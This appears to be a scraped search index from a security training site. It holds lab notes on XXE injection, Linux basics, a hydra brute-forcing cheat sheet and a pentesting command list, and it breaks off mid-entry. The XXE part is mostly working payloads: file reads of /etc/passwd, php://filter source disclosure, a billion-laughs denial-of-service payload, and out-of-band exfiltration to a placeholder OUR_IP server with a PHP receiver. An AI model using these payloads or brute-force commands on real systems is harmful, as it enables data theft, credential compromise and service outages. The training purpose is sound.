<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company SYSTEM \"http://localhost/company.txt\"> <!ENTITY signature SYSTEM \"file:///var/www/html/signature.txt\"> ]>","title":"XML Entities"},{"location":"attacking_web_applications/xxe/#local-file-disclosure","text":"If we fill the contact form and click on Send Data , then intercept the HTTP request with Burp, we get the following request: If we send the form without any modification, we get the following message: We see that the value of the email element is being displayed back to us on the page. To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into . we know that whatever value we place in the <email></email> element gets displayed in the HTTP response. Define a new entity and then use it as a variable in the email element to see whether it gets replaced with the value we defined. <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> We should have a new XML entity called company , which we can reference with &company ;. So, instead of using our email in the email element, let us try using &company ;, and see whether it will be replaced with the value we defined ( Inlane Freight ): The response did use the value of the entity we defined ( Inlane Freight ) instead of displaying &company; , indicating that we may inject XML code. This confirms that we are dealing with a web application vulnerable to XXE.","title":"Local File Disclosure"},{"location":"attacking_web_applications/xxe/#reading-sensitive-files","text":"<!DOCTYPE email [ <!ENTITY company SYSTEM \"file:///etc/passwd\"> ]> Send the modified request and see whether the value of our external XML entity gets set to the file we reference:","title":"Reading Sensitive Files"},{"location":"attacking_web_applications/xxe/#reading-source-code","text":"This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys. This did not work. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity . PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format <!DOCTYPE email [ <!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]> This trick only works with PHP web applications.","title":"Reading Source Code"},{"location":"attacking_web_applications/xxe/#other-xxe-attacks","text":"In addition to reading local files, we may execute commands on the back-end with the PHP://expect filter or utilize a hash stealing trick in Windows-based web applications. One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload: <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ENTITY a0 \"DOS\" > <!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"> <!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"> <!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"> <!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"> <!ENTITY a5 \"&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;\"> <!ENTITY a6 \"&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;\"> <!ENTITY a7 \"&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;\"> <!ENTITY a8 \"&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;\"> <!ENTITY a9 \"&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;\"> <!ENTITY a10 \"&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;\"> ]> <root> <name></name> <tel></tel> <email> &a10; </email> <message></message> </root> This payload defines the a0 entity as DOS , references it in a1 multiple times, references a1 in a2 , and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference .","title":"Other XXE Attacks"},{"location":"attacking_web_applications/xxe/#advanced-exfiltration-with-cdata","text":"Let's try to read the submitDetails.php file by first storing below line in a DTD file (e.g. xxe.dtd ), host it on our machine, and then reference it as an external entity on the target web application hrmns@htb[/htb]$ echo '<!ENTITY joined \"%begin;%file;%end;\">' > xxe.dtd hrmns@htb[/htb]$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Reference our external entity ( xxe.dtd ) and then print the &joined; entity we defined above, which should contain the content of the file: <!DOCTYPE email [ <!ENTITY % begin \"<![CDATA[\"> <!-- prepend the beginning of the CDATA tag --> <!ENTITY % file SYSTEM \"file:///var/www/html/submitDetails.php\"> <!-- reference external file --> <!ENTITY % end \"]]> \"> <!-- append the end of the CDATA tag --> <!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> <!-- reference our external DTD --> %xxe; ]> ... <email> &joined; </email> <!-- reference the &joined; entity to print the file content --> Once we write our xxe.dtd file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the submitDetails.php file: We were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords. In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop). This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks.","title":"Advanced Exfiltration with CDATA"},{"location":"attacking_web_applications/xxe/#error-based-xxe","text":"Try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root> ), or just reference a non-existing entity We cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. First, host a DTD file that contains the following payload: <!ENTITY % file SYSTEM \"file:///etc/hosts\"> <!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'> \"> Above payload defines the file parameter entity and then joins it with an entity that does not exist. In this case, %nonExistingEntity; does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error. Call our external DTD script, and then reference the error entity: <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %error; ]> Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file: This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. \" file:///var/www/html/submitDetails.php \"). However, this method is not as reliable as the previous method for reading source files , as it may have length limitations, and certain special characters may still break it.","title":"Error Based XXE"},{"location":"attacking_web_applications/xxe/#blind-data-exfiltration","text":"Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading. We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP: <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> <!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\"> If, the file we want to read had the content of XXE_SAMPLE_DATA , then the file parameter would hold its base64 encoded data ( WFhFX1NBTVBMRV9EQVRB ). When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB . Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal: <?php if ( isset ( $_GET [ 'content' ])){ error_log ( \" \\n\\n \" . base64_decode ( $_GET [ 'content' ])); } ?> So, we will first write the above PHP code to index.php , and then start a PHP server on port 8000: hrmns@htb[/htb]$ vi index.php # here we write the above PHP code hrmns@htb[/htb]$ php -S 0 .0.0.0:8000 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started To initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root> , which is needed to reference our entity and have it send the request to our machine with the file content: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %oob; ]> <root> &content; </root> Send request to web app: Finally, back to terminal, we did indeed get the request and its decoded content: PHP 7.4.3 Development Server (http://0.0.0.0:8000) started 10.10.14.16:46256 Accepted 10.10.14.16:46256 [200]: (null) /xxe.dtd 10.10.14.16:46256 Closing 10.10.14.16:46258 Accepted root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...SNIP...","title":"Blind Data Exfiltration"},{"location":"attacking_web_applications/xxe/#automated-oob-exfiltration","text":"Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. hrmns@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git Cloning into 'XXEinjector'... ...SNIP... Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool: POST /blind/submitDetails.php HTTP/1.1 Host: 10.129.201.94 Content-Length: 169 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://10.129.201.94 Referer: http://10.129.201.94/blind/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> XXEINJECT Run the tool with the --host / --httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. Also select the --oob=http and --phpfilter flags to repeat the OOB attack we did above: hrmns@htb[/htb]$ ruby XXEinjector.rb --host = 127 .0.0.1 --httpport = 8000 --file = /tmp/xxe.req --path = /etc/passwd --oob = http --phpfilter ...SNIP... [+] Sending request with malicious XML. [+] Responding with XML for: /etc/passwd [+] Retrieved data: We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there: hrmns@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...SNIP..","title":"Automated OOB Exfiltration"},{"location":"basics_linux/linux/","text":"Structure \u00b6 Path Description / The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root. /bin Contains essential command binaries. /boot Consists of the static bootloader, kernel executable, and files required to boot the Linux OS. /dev Contains device files to facilitate access to every hardware device attached to the system. /etc Local system configuration files. Configuration files for installed applications may be saved here as well. /home Each user on the system has a subdirectory here for storage. /lib Shared library files that are required for system boot. /media External removable media devices such as USB drives are mounted here. /mnt Temporary mount point for regular filesystems. /opt Optional files such as third-party tools can be saved here. /root The home directory for the root user. /sbin This directory contains executables used for system administration (binary system files). /tmp The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning. /usr Contains executables, libraries, man files, etc. /var This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more. System Information \u00b6 Command Description whoami Displays current username. id Returns users identity hostname Sets or prints the name of current host system. uname Prints basic information about the operating system name and system hardware. pwd Returns working directory name. ifconfig The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters. ip Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels. netstat Shows network status. ss Another utility to investigate sockets. ps Shows process status. who Displays who is logged in. env Prints environment or sets and executes command. lsblk Lists block devices. lsusb Lists USB devices lsof Lists opened files. lspci Lists PCI devices. User Mgmt \u00b6 Command Description sudo Execute command as a different user. su The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed. useradd Creates a new user or update default new user information. userdel Deletes a user account and related files. usermod Modifies a user account. addgroup Adds a group to the system. delgroup Removes a group from the system. passwd Changes user password. Package Mgmt \u00b6 Command Description dpkg The dpkg is a tool to install, build, remove, and manage Debian packages. The primary and more user-friendly front-end for dpkg is aptitude. apt Apt provides a high-level command-line interface for the package management system. aptitude Aptitude is an alternative to apt and is a high-level interface to the package manager. snap Install, configure, refresh, and remove snap packages. Snaps enable the secure distribution of the latest apps and utilities for the cloud, servers, desktops, and the internet of things. gem Gem is the front-end to RubyGems, the standard package manager for Ruby. pip Pip is a Python package installer recommended for installing Python packages that are not available in the Debian archive. It can work with version control repositories (currently only Git, Mercurial, and Bazaar repositories), logs output extensively, and prevents partial installs by downloading all requirements before starting installation. git Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. Find Files and Directories \u00b6 hrmns@htb[/htb]$ find / -type f -name *.conf -user root -size +20k -newermt 2020 -03-03 -exec ls -al {} \\; 2 >/dev/null -rw-r--r-- 1 root root 136392 Apr 25 20:29 /usr/src/linux-headers-5.5.0-1parrot1-amd64/include/config/auto.conf -rw-r--r-- 1 root root 82290 Apr 25 20:29 /usr/src/linux-headers-5.5.0-1parrot1-amd64/include/config/tristate.conf -rw-r--r-- 1 root root 95813 May 7 14:33 /usr/share/metasploit-framework/data/jtr/repeats32.conf -rw-r--r-- 1 root root 60346 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dynamic.conf -rw-r--r-- 1 root root 96249 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dumb32.conf -rw-r--r-- 1 root root 54755 May 7 14:33 /usr/share/metasploit-framework/data/jtr/repeats16.conf -rw-r--r-- 1 root root 22635 May 7 14:33 /usr/share/metasploit-framework/data/jtr/korelogic.conf -rwxr-xr-x 1 root root 108534 May 7 14:33 /usr/share/metasploit-framework/data/jtr/john.conf -rw-r--r-- 1 root root 55285 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dumb16.conf -rw-r--r-- 1 root root 21254 May 2 11:59 /usr/share/doc/sqlmap/examples/sqlmap.conf -rw-r--r-- 1 root root 25086 Mar 4 22:04 /etc/dnsmasq.conf -rw-r--r-- 1 root root 21254 May 2 11:59 /etc/sqlmap/sqlmap.conf Option Description -type f Hereby, we define the type of the searched object. In this case, ' f ' stands for ' file '. -name *.conf With ' -name ', we indicate the name of the file we are looking for. The asterisk ( * ) stands for 'all' files with the ' .conf ' extension. -user root This option filters all files whose owner is the root user. -size +20k We can then filter all the located files and specify that we only want to see the files that are larger than 20 KiB. -newermt 2020-03-03 With this option, we set the date. Only files newer than the specified date will be presented. -exec ls -al {} \\; This option executes the specified command, using the curly brackets as placeholders for each result. The backslash escapes the next character from being interpreted by the shell because otherwise, the semicolon would terminate the command and not reach the redirection. 2>/dev/null This is a STDERR redirection to the ' null device ', which we will come back to in the next section. This redirection ensures that no errors are displayed in the terminal. This redirection must not be an option of the 'find' command. In contrast to the find command, locate works with a local database that contains all information about existing files and folders. hrmns@htb[/htb]$ sudo updatedb hrmns@htb[/htb]$ locate *.conf /etc/GeoIP.conf /etc/NetworkManager/NetworkManager.conf /etc/UPower/UPower.conf /etc/adduser.conf <SNIP> Filter Contents \u00b6 hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | cut -d \":\" -f1 root sync mrb3n cry0l1t3 htb-student Tr As the first option, we define which character we want to replace, and as a second option, we define the character we want to replace it with. In the next example, we replace the colon character with space. hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" root x 0 0 root /root /bin/bash sync x 4 65534 sync /bin /bin/sync mrb3n x 1000 1000 mrb3n /home/mrb3n /bin/bash cry0l1t3 x 1001 1001 /home/cry0l1t3 /bin/bash htb-student x 1002 1002 /home/htb-student /bin/bash Wc To avoid counting the lines or characters manually, we can use the tool wc. With the \"-l\" option, we specify that only the lines are counted. hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | awk '{print $1, $NF}' | wc -l Permission Mgmt \u00b6 The permissions can be set for the owner , group , and others hrmns@htb[/htb]$ ls -l /etc/passwd - rwx rw- r-- 1 root root 1641 May 4 23:42 /etc/passwd - --- --- --- | | | | |__________| | | | | | | | | |_ Date | | | | | | | |__________ File Size | | | | | | |_______________ Group | | | | | |____________________ User | | | | |_______________________ Number of hard links | | | |_ Permission of others (read) | | |_____ Permissions of the group (read, write) | |_________ Permissions of the owner (read, write, execute) |____________ File type (- = File, d = Directory, l = Link, ... ) How the permission assignment is calculated Binary Notation: 4 2 1 | 4 2 1 | 4 2 1 ---------------------------------------------------------- Binary Representation: 1 1 1 | 1 0 1 | 1 0 0 ---------------------------------------------------------- Octal Value: 7 | 5 | 4 ---------------------------------------------------------- Permission Representation: r w x | r - x | r - - SUID & GUID \u00b6 We can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (GUID) bits. It is often the case that administrators are not familiar with the applications but still assign the SUID/GUID bits, which leads to a high-security risk.","title":"Linux"},{"location":"basics_linux/linux/#structure","text":"Path Description / The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root. /bin Contains essential command binaries. /boot Consists of the static bootloader, kernel executable, and files required to boot the Linux OS. /dev Contains device files to facilitate access to every hardware device attached to the system. /etc Local system configuration files. Configuration files for installed applications may be saved here as well. /home Each user on the system has a subdirectory here for storage. /lib Shared library files that are required for system boot. /media External removable media devices such as USB drives are mounted here. /mnt Temporary mount point for regular filesystems. /opt Optional files such as third-party tools can be saved here. /root The home directory for the root user. /sbin This directory contains executables used for system administration (binary system files). /tmp The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning. /usr Contains executables, libraries, man files, etc. /var This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.","title":"Structure"},{"location":"basics_linux/linux/#system-information","text":"Command Description whoami Displays current username. id Returns users identity hostname Sets or prints the name of current host system. uname Prints basic information about the operating system name and system hardware. pwd Returns working directory name. ifconfig The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters. ip Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels. netstat Shows network status. ss Another utility to investigate sockets. ps Shows process status. who Displays who is logged in. env Prints environment or sets and executes command. lsblk Lists block devices. lsusb Lists USB devices lsof Lists opened files. lspci Lists PCI devices.","title":"System Information"},{"location":"basics_linux/linux/#user-mgmt","text":"Command Description sudo Execute command as a different user. su The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed. useradd Creates a new user or update default new user information. userdel Deletes a user account and related files. usermod Modifies a user account. addgroup Adds a group to the system. delgroup Removes a group from the system. passwd Changes user password.","title":"User Mgmt"},{"location":"basics_linux/linux/#package-mgmt","text":"Command Description dpkg The dpkg is a tool to install, build, remove, and manage Debian packages. The primary and more user-friendly front-end for dpkg is aptitude. apt Apt provides a high-level command-line interface for the package management system. aptitude Aptitude is an alternative to apt and is a high-level interface to the package manager. snap Install, configure, refresh, and remove snap packages. Snaps enable the secure distribution of the latest apps and utilities for the cloud, servers, desktops, and the internet of things. gem Gem is the front-end to RubyGems, the standard package manager for Ruby. pip Pip is a Python package installer recommended for installing Python packages that are not available in the Debian archive. It can work with version control repositories (currently only Git, Mercurial, and Bazaar repositories), logs output extensively, and prevents partial installs by downloading all requirements before starting installation. git Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals.","title":"Package Mgmt"},{"location":"basics_linux/linux/#find-files-and-directories","text":"hrmns@htb[/htb]$ find / -type f -name *.conf -user root -size +20k -newermt 2020 -03-03 -exec ls -al {} \\; 2 >/dev/null -rw-r--r-- 1 root root 136392 Apr 25 20:29 /usr/src/linux-headers-5.5.0-1parrot1-amd64/include/config/auto.conf -rw-r--r-- 1 root root 82290 Apr 25 20:29 /usr/src/linux-headers-5.5.0-1parrot1-amd64/include/config/tristate.conf -rw-r--r-- 1 root root 95813 May 7 14:33 /usr/share/metasploit-framework/data/jtr/repeats32.conf -rw-r--r-- 1 root root 60346 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dynamic.conf -rw-r--r-- 1 root root 96249 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dumb32.conf -rw-r--r-- 1 root root 54755 May 7 14:33 /usr/share/metasploit-framework/data/jtr/repeats16.conf -rw-r--r-- 1 root root 22635 May 7 14:33 /usr/share/metasploit-framework/data/jtr/korelogic.conf -rwxr-xr-x 1 root root 108534 May 7 14:33 /usr/share/metasploit-framework/data/jtr/john.conf -rw-r--r-- 1 root root 55285 May 7 14:33 /usr/share/metasploit-framework/data/jtr/dumb16.conf -rw-r--r-- 1 root root 21254 May 2 11:59 /usr/share/doc/sqlmap/examples/sqlmap.conf -rw-r--r-- 1 root root 25086 Mar 4 22:04 /etc/dnsmasq.conf -rw-r--r-- 1 root root 21254 May 2 11:59 /etc/sqlmap/sqlmap.conf Option Description -type f Hereby, we define the type of the searched object. In this case, ' f ' stands for ' file '. -name *.conf With ' -name ', we indicate the name of the file we are looking for. The asterisk ( * ) stands for 'all' files with the ' .conf ' extension. -user root This option filters all files whose owner is the root user. -size +20k We can then filter all the located files and specify that we only want to see the files that are larger than 20 KiB. -newermt 2020-03-03 With this option, we set the date. Only files newer than the specified date will be presented. -exec ls -al {} \\; This option executes the specified command, using the curly brackets as placeholders for each result. The backslash escapes the next character from being interpreted by the shell because otherwise, the semicolon would terminate the command and not reach the redirection. 2>/dev/null This is a STDERR redirection to the ' null device ', which we will come back to in the next section. This redirection ensures that no errors are displayed in the terminal. This redirection must not be an option of the 'find' command. In contrast to the find command, locate works with a local database that contains all information about existing files and folders. hrmns@htb[/htb]$ sudo updatedb hrmns@htb[/htb]$ locate *.conf /etc/GeoIP.conf /etc/NetworkManager/NetworkManager.conf /etc/UPower/UPower.conf /etc/adduser.conf <SNIP>","title":"Find Files and Directories"},{"location":"basics_linux/linux/#filter-contents","text":"hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | cut -d \":\" -f1 root sync mrb3n cry0l1t3 htb-student Tr As the first option, we define which character we want to replace, and as a second option, we define the character we want to replace it with. In the next example, we replace the colon character with space. hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" root x 0 0 root /root /bin/bash sync x 4 65534 sync /bin /bin/sync mrb3n x 1000 1000 mrb3n /home/mrb3n /bin/bash cry0l1t3 x 1001 1001 /home/cry0l1t3 /bin/bash htb-student x 1002 1002 /home/htb-student /bin/bash Wc To avoid counting the lines or characters manually, we can use the tool wc. With the \"-l\" option, we specify that only the lines are counted. hrmns@htb[/htb]$ cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | awk '{print $1, $NF}' | wc -l","title":"Filter Contents"},{"location":"basics_linux/linux/#permission-mgmt","text":"The permissions can be set for the owner , group , and others hrmns@htb[/htb]$ ls -l /etc/passwd - rwx rw- r-- 1 root root 1641 May 4 23:42 /etc/passwd - --- --- --- | | | | |__________| | | | | | | | | |_ Date | | | | | | | |__________ File Size | | | | | | |_______________ Group | | | | | |____________________ User | | | | |_______________________ Number of hard links | | | |_ Permission of others (read) | | |_____ Permissions of the group (read, write) | |_________ Permissions of the owner (read, write, execute) |____________ File type (- = File, d = Directory, l = Link, ... ) How the permission assignment is calculated Binary Notation: 4 2 1 | 4 2 1 | 4 2 1 ---------------------------------------------------------- Binary Representation: 1 1 1 | 1 0 1 | 1 0 0 ---------------------------------------------------------- Octal Value: 7 | 5 | 4 ---------------------------------------------------------- Permission Representation: r w x | r - x | r - -","title":"Permission Mgmt"},{"location":"basics_linux/linux/#suid-guid","text":"We can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (GUID) bits. It is often the case that administrators are not familiar with the applications but still assign the SUID/GUID bits, which leads to a high-security risk.","title":"SUID &amp; GUID"},{"location":"basics_windows/windows/","text":"Placeholder \u00b6","title":"Windows"},{"location":"basics_windows/windows/#placeholder","text":"","title":"Placeholder"},{"location":"blog/","text":".md-sidebar--secondary:not([hidden]) { visibility: hidden; } Blog \u00b6 Lets Connect \u00b6 SecOps.cc is an information security platform designed to cover various offensive & defensive security topics. dh \u00b7 @hrmnsio January 04, 2022 \u00b7 2 min read Cybersecurity is a vast field of study with so much to offer including challenge, community and satisfaction. Through SecOps.cc I share and promote cybersecurity resources as well as writeups for machines on hackthebox and CTF competitions. Continue reading","title":"Blog"},{"location":"blog/#blog","text":"","title":"Blog"},{"location":"blog/#lets-connect","text":"SecOps.cc is an information security platform designed to cover various offensive & defensive security topics. dh \u00b7 @hrmnsio January 04, 2022 \u00b7 2 min read Cybersecurity is a vast field of study with so much to offer including challenge, community and satisfaction. Through SecOps.cc I share and promote cybersecurity resources as well as writeups for machines on hackthebox and CTF competitions. Continue reading","title":"Lets Connect"},{"location":"blog/2022/lets_connect/","text":"Lets Connect \u00b6 SecOps.cc is an information security platform designed to cover various offensive & defensive security topics. dh \u00b7 @hrmnsio Januar 04, 2022 \u00b7 2 min read Cybersecurity is a vast field of study with so much to offer including challenge, community and satisfaction. Through SecOps.cc I share and promote cybersecurity resources as well as writeups for machines on hackthebox and CTF competitions.","title":"Lets Connect"},{"location":"blog/2022/lets_connect/#lets-connect","text":"SecOps.cc is an information security platform designed to cover various offensive & defensive security topics. dh \u00b7 @hrmnsio Januar 04, 2022 \u00b7 2 min read Cybersecurity is a vast field of study with so much to offer including challenge, community and satisfaction. Through SecOps.cc I share and promote cybersecurity resources as well as writeups for machines on hackthebox and CTF competitions.","title":"Lets Connect"},{"location":"cheat_sheets/brute_forcing/","text":"Hydra \u00b6 Command Description hydra -h hydra help hydra -C wordlist.txt SERVER_IP -s PORT http-get / Basic Auth Brute Force - Combined Wordlist hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get / Basic Auth Brute Force - User/Pass Wordlists hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Login Form Brute Force - Static User, Pass Wordlist hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4 SSH Brute Force - User/Pass Wordlists hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 FTP Brute Force - Static User, Pass Wordlist Wordlists \u00b6 Command Description /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt Default Passwords Wordlist /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt Common Passwords Wordlist /opt/useful/SecLists/Usernames/Names/names.txt Common Names Wordlist Misc \u00b6 Command Description cupp -i Creating Custom Password Wordlist sed -ri '/^.{,7}$/d' william.txt Remove Passwords Shorter Than 8 sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt Remove Passwords With No Special Chars sed -ri '/[0-9]+/!d' william.txt Remove Passwords With No Numbers git clone https://github.com/21y4d/usernameGenerator.git Download usernameGenerator bash usernameGenerator/usernameGenerator.sh <First Name> <Last Name> usernameGenerator Usage ssh b.gates@SERVER_IP -p PORT SSH to Server ftp 127.0.0.1 FTP to Server su - user Switch to User","title":"Brute Forcing"},{"location":"cheat_sheets/brute_forcing/#hydra","text":"Command Description hydra -h hydra help hydra -C wordlist.txt SERVER_IP -s PORT http-get / Basic Auth Brute Force - Combined Wordlist hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get / Basic Auth Brute Force - User/Pass Wordlists hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\" Login Form Brute Force - Static User, Pass Wordlist hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4 SSH Brute Force - User/Pass Wordlists hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1 FTP Brute Force - Static User, Pass Wordlist","title":"Hydra"},{"location":"cheat_sheets/brute_forcing/#wordlists","text":"Command Description /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt Default Passwords Wordlist /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt Common Passwords Wordlist /opt/useful/SecLists/Usernames/Names/names.txt Common Names Wordlist","title":"Wordlists"},{"location":"cheat_sheets/brute_forcing/#misc","text":"Command Description cupp -i Creating Custom Password Wordlist sed -ri '/^.{,7}$/d' william.txt Remove Passwords Shorter Than 8 sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt Remove Passwords With No Special Chars sed -ri '/[0-9]+/!d' william.txt Remove Passwords With No Numbers git clone https://github.com/21y4d/usernameGenerator.git Download usernameGenerator bash usernameGenerator/usernameGenerator.sh <First Name> <Last Name> usernameGenerator Usage ssh b.gates@SERVER_IP -p PORT SSH to Server ftp 127.0.0.1 FTP to Server su - user Switch to User","title":"Misc"},{"location":"cheat_sheets/cheatsheet-77/","text":"Basic Tools \u00b6 Command Description General sudo openvpn user.ovpn Connect to VPN ifconfig / ip a Show our IP address netstat -rn Show networks accessible via the VPN ssh user@10.10.10.10 SSH to a remote server ftp 10.129.42.253 FTP to a remote server tmux tmux Start tmux ctrl+b ctrl+c tmux: new window ctrl+b 1 tmux: switch to window ( 1 ) ctrl+% tmux: split pane vertically ctrl+\" tmux: split pane horizontally ctrl+-> tmux: switch to the right pane ctrl+b + : tmux: switch to scroll mode setw -g mouse on tmux: enable mousewheel scrolling Vim vim file vim: open file with vim esc+i vim: enter insert mode esc vim: back to normal mode x vim: Cut character dw vim: Cut word dd vim: Cut full line yw vim: Copy word yy vim: Copy full line p vim: Paste :1 vim: Go to line number 1. :w vim: Write the file 'i.e. save' :q vim: Quit :q! vim: Quit without saving :wq vim: Write and quit Pentesting \u00b6 Command Description Service Scanning nmap 10.129.42.253 Run nmap on an IP nmap -sV -sC -p- 10.129.42.253 Run an nmap script scan on an IP locate scripts/citrix List various available nmap scripts nmap --script smb-os-discovery.nse -p445 10.10.10.40 Run an nmap script on an IP netcat 10.10.10.10 22 Grab banner of an open port smbclient -N -L \\\\\\\\10.129.42.253 List SMB Shares smbclient \\\\\\\\10.129.42.253\\\\users Connect to an SMB share snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 Scan SNMP on an IP onesixtyone -c dict.txt 